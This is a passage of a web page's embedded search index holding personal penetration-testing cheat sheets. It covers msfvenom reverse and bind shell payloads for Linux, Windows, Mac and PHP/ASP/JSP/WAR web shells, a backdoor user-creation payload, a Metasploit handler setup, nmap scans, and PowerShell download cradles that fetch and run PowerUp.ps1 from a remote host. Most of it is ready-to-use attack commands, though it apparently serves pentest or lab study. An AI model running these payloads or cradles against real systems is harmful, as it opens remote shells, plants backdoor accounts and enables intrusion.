SAM -security SECURITY -system SYSTEM LOCAL"
					}

					
				
			
		
			
				
					,
					

					"8-cheatsheets-msfvenom": {
						"id": "8-cheatsheets-msfvenom",
						"title": "msfvenom",
						"category": "",
						"url": " /8-cheatsheets/msfvenom/",
						"content": "List payloads\n\nmsfvenom -l\n\n\nBinaries Payloads\n\n\n| Linux Meterpreter Reverse Shell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf\n\n| Linux Bind Meterpreter Shell\nmsfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf\n\n| Linux Bind Shell\nmsfvenom -p generic/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf\n\n| Windows Meterpreter Reverse TCP Shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe\n\n| Windows Reverse TCP Shell\nmsfvenom -p windows/shell/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe\n\n| Windows Encoded Meterpreter Windows Reverse Shell\nmsfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe\n\n| Mac Reverse Shell\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho\n\n| Mac Bind Shell\nmsfvenom -p osx/x86/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho\n\nWeb Payloads\n\n| PHP Meterpreter Reverse TCP\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php\ncat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n\n| ASP Meterpreter Reverse TCP\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp\n\n| JSP Java Meterpreter Reverse TCP\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp\n\n| WAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war\n\nScripting Payloads\n\n| Python Reverse Shell\nmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py\n\n| Bash Unix Reverse Shell\nmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh\n\n| Perl Unix Reverse shell\nmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl\n\n\nShellcode\n\n\n| Windows Meterpreter Reverse TCP Shellcode\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;\n\n| Linux Meterpreter Reverse TCP Shellcode\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;\n\n| Mac Reverse TCP Shellcode\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;\n\n| Create User\nmsfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe\n\n\nMetasploit Handler\n\nuse exploit/multi/handler\nset PAYLOAD &lt;Payload name&gt;\nSet RHOST &lt;Remote IP&gt;\nset LHOST &lt;Local IP&gt;\nset LPORT &lt;Local Port&gt;\nRun"
					}

					
				
			
		
			
				
					,
					

					"8-cheatsheets-nmap": {
						"id": "8-cheatsheets-nmap",
						"title": "nmap",
						"category": "",
						"url": " /8-cheatsheets/nmap/",
						"content": "Nmap stealth scan using SYN\nnmap -sS $ip\n  \n  \n    Nmap stealth scan using FIN\nnmap -sF $ip\n  \n  \n    Nmap Banner Grabbing\nnmap -sV -sT $ip\n  \n  \n    Nmap OS Fingerprinting\nnmap -O $ip\n  \n  \n    Nmap Regular Scan:\nnmap $ip/24\n  \n  \n    Enumeration Scan\nnmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt\n  \n  \n    Enumeration Scan All Ports TCP / UDP and output to a txt file\nnmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip\n  \n  \n    Nmap output to a file:\nnmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24\n  \n  \n    Quick Scan:\nnmap -T4 -F $ip/24\n  \n  \n    Quick Scan Plus:\nnmap -sV -T4 -O -F --version-light $ip/24\n  \n  \n    Quick traceroute\nnmap -sn --traceroute $ip\n  \n  \n    All TCP and UDP Ports\nnmap -v -sU -sS -p- -A -T4 $ip\n  \n  \n    Intense Scan:\nnmap -T4 -A -v $ip\n  \n  \n    Intense Scan Plus UDP\nnmap -sS -sU -T4 -A -v $ip/24\n  \n  \n    Intense Scan ALL TCP Ports\nnmap -p 1-65535 -T4 -A -v $ip/24\n  \n  \n    Intense Scan - No Ping\nnmap -T4 -A -v -Pn $ip/24\n  \n  \n    Ping scan\nnmap -sn $ip/24\n  \n  \n    Slow Comprehensive Scan\nnmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script \"default or (discovery and safe)\" $ip/24\n  \n  \n    Scan with Active connect in order to weed out any spoofed ports designed to troll you\nnmap -p1-65535 -A -T5 -sT $ip"
					}

					
				
			
		
			
				
					,
					

					"8-cheatsheets-powershell": {
						"id": "8-cheatsheets-powershell",
						"title": "powershell",
						"category": "",
						"url": " /8-cheatsheets/powershell/",
						"content": "1- Download file\n\nC:&gt; powershell “IEX(New-Objet Net.WebClient).downloadString(‘http://10.10.14.23/PowerUp.ps1’)”\n\n2- RUN powerup\npowershell.exe -C “IEX (New-Object Net.WebClient).DownloadString(‘http://10.10.14.23:8000/PowerUp.ps1’);Invoke-AllChecks”"
					}

					
				
			
		
			
				
					,
					

					"8-cheatsheets-tmux": {
						"id": "8-cheatsheets-tmux",
						"title": "tmux",
						"category": "",
						"url": " /8-cheatsheets/tmux/",
						"content": "z* new sesion\ntmux new -s Nombre\n\n\n  \n    new window\n^ + C\n  \n  \n    list sessions\ntmux ls\n  \n  \n    attach\ntmux a -t Nombre\n  \n  \n    detach\n^ + d\n  \n  \n    zoom panel\n^ + z\n  \n  change layout\n^ + spacebar\n  \n    copy mode in config con vi (pa copear)\n  \n  log\n\n\nbash\n\n\n  \n    alt + .  se mueve por el historial de palabras\n  \n  ctrl + a  beginig of line\n  ctrl + e end of the line\n  ctrl +   mueve por linea"
					}

					
				
			
		
	};
</script>
<script src="/scripts/lunr.min.js"></script>
<script src="/scripts/search.js"></script>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
